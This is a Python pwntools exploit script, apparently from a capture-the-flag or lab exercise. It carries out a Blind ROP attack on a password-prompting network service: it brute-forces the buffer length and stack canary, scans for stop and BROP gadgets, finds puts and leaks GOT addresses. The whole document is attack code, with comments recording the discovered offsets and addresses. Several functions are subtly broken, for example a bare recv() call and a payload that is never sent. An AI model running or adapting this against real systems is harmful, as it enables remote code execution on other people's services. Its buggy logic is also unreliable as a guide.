from pwn import *
from LibcSearcher import *

#leak buf = 72
def leakbuff_length():
	i=1
	while 1:
		try:
			p=remote('0.0.0.0',9999)
			p.recvuntil('password?\n')
			p.sendline('A'*i)
			msg=p.recv()
			p.close()
			if 'password' in msg:
				i = i+1
				continue
		except EOFError:
			p.close()
			print i-1
			break

def boomcanary():
	step=1
	buf='A'*72
	canary_sing=0x00
	while 1:
		try:
			p=remote('0.0.0.0',9999)
			p.recvuntil('password?\n')
			p.sendline(buf+chr(canary_sing))
			msg=recv()
			p.close()
			if step == 4:
				break
			else:
				buf=buf+str(canary_sing)
				canary_sing=0x00
				step=step+1
		except EOFError:
			p.close()
			canary_sing=canary_sing+1
		
def Get_Stop_Gadgets(length):
	addr=0x4000000
	while 1:
		try:
			p=remote('0.0.0.0',9999)
			p.recvuntil("password?\n")
			p.sendline('A'*length+p64(addr))
			p.recv()
			p.close()
			print "The address is %x"%addr
			break
		except Exception:
			addr=addr+1
			p.close()

def Get_Brop_Gadget(length,stop_gadgets):
	brop_addr=stop_gadgets-1	
	while 1:
		try:
			p=remote('0.0.0.0',9999)
			p.recvuntil("password?\n")
			payload='A'*length+p64(brop_addr)+p64(0)*6+p64(stop_gadgets)
			p.sendline(payload)
			p.recv()
			p.close()
			print "We find the csu_brop_addr%x"%brop_addr
			break
		except Exception:
			#p.close()
			brop_addr=brop_addr-1 

def Check_Brop_Gadgets(length,brop_addr):
	payload='A'*length+p64(brop_addr)+p64(1)*10
	p=remote('0.0.0.0',9999)
	p.recvuntil("password?\n")
	try:
		p.close()
		print "This addr %x not brop"%brop_addr
	except Exception:
		print "This addr is Brop"
		p.close()

def Get_Put_addr(length,pop_rdi_ret,stop_gadget):
	put_addr=0x400000
	while 1:
		print hex(put_addr)
		p=remote('0.0.0.0',9999)
		p.recvuntil("password?\n")
		payload='A'*length+p64(pop_rdi_ret)+p64(0x400000)+p64(put_addr)+p64(stop_gadget)
		p.sendline(payload)
		try:
			if 'ELF' in p.recv():
				print "This addr is put"
				p.close()
				break
		except Exception:
			p.close()
			put_addr=put_addr+1
						

def leak_got(length,pop_rdi_ret,puts_plt,leak_addr,stop_gadget):
	p=remote('0.0.0.0',9999)
	p.recvuntil("password?\n")
	payload='A'*length+p64(pop_rdi_ret)+p64(leak_addr)+p64(puts_plt)+p64(stop_gadget)
	p.sendline(payload)
	try:
		msg=p.recv()
		if 'Welcome' in msg:
			print "The put_got addr is %x"%(u64(msg[0:8]))
			p.close()
	except Exception:
		p.close()
		print "something wrong?"
						



#leakbuff_length()
#boomcanary
#Get_Stop_Gadgets(72)
#main-->0x40006b6
#Get_Brop_Gadget(72,0x40006b6)
#Check_Brop_Gadgets(72,0x40006b6)-->0x40006b6
#Get_Put_addr(72,0x40006b6-9,0x40006b6)--->0x400560 


